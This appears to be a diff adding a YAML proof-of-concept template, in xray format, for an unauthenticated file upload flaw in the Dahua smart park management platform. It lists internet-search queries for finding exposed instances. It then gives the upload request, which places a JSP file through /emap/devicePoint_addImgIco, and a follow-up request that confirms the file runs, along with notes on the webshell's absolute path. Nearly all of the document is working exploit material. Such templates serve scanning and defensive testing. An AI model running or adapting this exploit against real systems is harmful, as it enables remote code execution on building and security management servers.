@@ -1,0 +1,58 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台" | web.body="/WPMS/asset/lib/gridster/"    
+    quake-query: app:"dahua-WP"
+    zoomeye-query: title:"智慧园区综合管理平台"
+    threatbook-query: app=大华
+    cve: 
+    cnvd:
+    tips:  /upload/emap/society_new/ico_res_xxx_on.jsp  |  绝对路径  /opt/tomcat/webapps/upload/emap/society_new/ico_res_xxx_on.jsp  | 有些9080端口会上传到8314 或者其他端口上
+
+name: poc-yaml-dahua-zonghe-devicePoint_addImgIco-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            follow_redirects: false
+            path: /emap/devicePoint_addImgIco?hasSubsystem=true
+            headers:
+              Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+              Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+              Accept-Encoding: gzip, deflate
+            body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"4ndex.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%out.println(\"4ra1n\");%>\r\n------WebKitFormBoundary{{s2}}--"     
+        expression: response.status == 200 && response.body_string.contains("ico_res")
+
+        output:
+          search: |-
+            "(?P<filename>ico.*jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /upload/emap/society_new/{{filename}}
+            # 这个洞傻就煞笔在301跳转之后的路径可能加了两个端口 不好判断，301的情况需要手工去测试,而且返回的路径可能是http:///这种
+            headers:
+            body:         
+        expression: response.status == 301 || (response.body_string.contains("4ra1n") && response.status == 200 )
+
+expression: r0() && r1()
